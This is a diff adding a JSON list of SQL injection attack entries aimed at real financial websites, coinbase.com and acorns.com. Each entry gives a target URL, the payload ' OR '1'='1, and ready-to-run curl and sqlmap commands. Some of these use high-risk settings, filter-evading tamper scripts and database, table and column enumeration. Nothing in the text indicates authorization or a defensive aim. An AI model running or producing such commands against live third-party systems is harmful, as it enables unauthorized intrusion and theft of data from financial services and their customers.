@@ -1,0 +1,47 @@
+[
+  {
+    "url": "https://coinbase.com/user?id=1",
+    "method": "Manual Testing",
+    "payload": "' OR '1'='1",
+    "commands": [
+      "curl \"https://coinbase.com/user?id=1%27%20OR%20%271%27%3D%271\"",
+      "sqlmap -u \"https://coinbase.com/user?id=1\" --batch --level=1 --risk=1"
+    ]
+  },
+  {
+    "url": "https://coinbase.com/profile?id=1",
+    "method": "Manual Testing",
+    "payload": "' OR '1'='1",
+    "commands": [
+      "curl \"https://coinbase.com/profile?id=1%27%20OR%20%271%27%3D%271\"",
+      "sqlmap -u \"https://coinbase.com/profile?id=1\" --batch --level=1 --risk=1"
+    ]
+  },
+  {
+    "url": "https://coinbase.com/search?q=test",
+    "method": "Manual Testing",
+    "payload": "' OR '1'='1",
+    "commands": [
+      "curl \"https://coinbase.com/search?q=test%27%20OR%20%271%27%3D%271\"",
+      "sqlmap -u \"https://coinbase.com/search?q=test\" --batch --level=1 --risk=1"
+    ]
+  },
+  {
+    "url": "https://www.acorns.com/learn/search/?q=invest",
+    "method": "SQLMap",
+    "payload": "Multiple SQLMap payloads",
+    "commands": [
+      "sqlmap -u \"https://www.acorns.com/learn/search/?q=invest\" --batch --level=3 --risk=2 --technique=BEUSTQ --dbs --tables --columns",
+      "sqlmap -u \"https://www.acorns.com/learn/search/?q=invest\" --batch --level=5 --risk=3 --tamper=space2comment,charencode,randomcase"
+    ]
+  },
+  {
+    "url": "https://www.acorns.com/learn/?page=3",
+    "method": "SQLMap",
+    "payload": "Multiple SQLMap payloads",
+    "commands": [
+      "sqlmap -u \"https://www.acorns.com/learn/?page=3\" --batch --level=5 --risk=3 --timeout=120 --tamper=space2comment,charencode,randomcase --dbs --tables --columns",
+      "sqlmap -u \"https://www.acorns.com/learn/?page=3\" --batch --technique=B --threads=5"
+    ]
+  }
+]
